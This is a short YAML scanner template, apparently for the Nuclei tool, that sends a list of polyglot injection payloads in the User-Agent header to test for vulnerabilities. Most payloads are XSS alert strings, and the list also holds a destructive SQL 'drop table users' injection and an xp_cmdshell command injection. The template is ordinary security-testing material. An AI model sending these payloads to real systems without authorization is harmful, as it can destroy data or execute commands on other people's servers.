id: test-vulnerability-polyglots

info:
  name: Testing Polyglots Across Vulnerabilities
  author: ProjectDiscoveryAI
  severity: info
  description: |
    This template tests various polyglots across multiple vulnerabilities.
  tags: polyglot,vulnerability-test

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{polyglot}}

    payloads:
      polyglot:
        - "'><img src=x onerror=alert(1)>"
        - "<svg/onload=alert(2)>"
        - "--><script>alert('xss')</script>"
        - "\";!--\"<XSS>=&{()}"
        - "%3Cscript%3Ealert('polyglot')%3C/script%3E"
        - "\"; drop table users; --"
        - "\"; exec xp_cmdshell('ping 127.0.0.1'); --"

    attack: batteringram

    matchers:
      - type: word
        part: body
        words:
          - "XSS Detected"
          - "SQL Error"
          - "Command Injection"

    matchers-condition: or